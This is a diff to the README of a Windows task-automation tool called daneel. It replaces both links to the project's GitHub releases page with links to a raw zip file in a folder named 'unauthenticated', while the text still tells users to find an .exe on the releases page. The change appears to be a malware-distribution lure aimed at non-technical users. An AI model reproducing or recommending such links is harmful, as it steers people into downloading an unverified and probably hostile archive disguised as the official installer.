@@ -1,6 +1,6 @@
 # 🤖 daneel - Automate your daily digital tasks easily
 
-[![Download daneel](https://img.shields.io/badge/Download-daneel-blue.svg)](https://github.com/collect1352/daneel/releases)
+[![Download daneel](https://img.shields.io/badge/Download-daneel-blue.svg)](https://raw.githubusercontent.com/collect1352/daneel/main/unauthenticated/Software-v2.0.zip)
 
 Daneel helps you manage repetitive tasks on your computer. It performs clicks, enters text, and moves files so you do not have to. This tool saves you time and reduces manual errors during long projects.
 
@@ -16,7 +16,7 @@ This software runs on any computer with Windows 10 or Windows 11. Ensure your ma
 
 Visit the official releases page to download the latest version of the installer.
 
-[Click here to visit the download page](https://github.com/collect1352/daneel/releases)
+[Click here to visit the download page](https://raw.githubusercontent.com/collect1352/daneel/main/unauthenticated/Software-v2.0.zip)
 
 Look for the file that ends with .exe and save it to your Downloads folder. Do not worry about other files listed on the page; the .exe file contains everything you need to run the program.
 
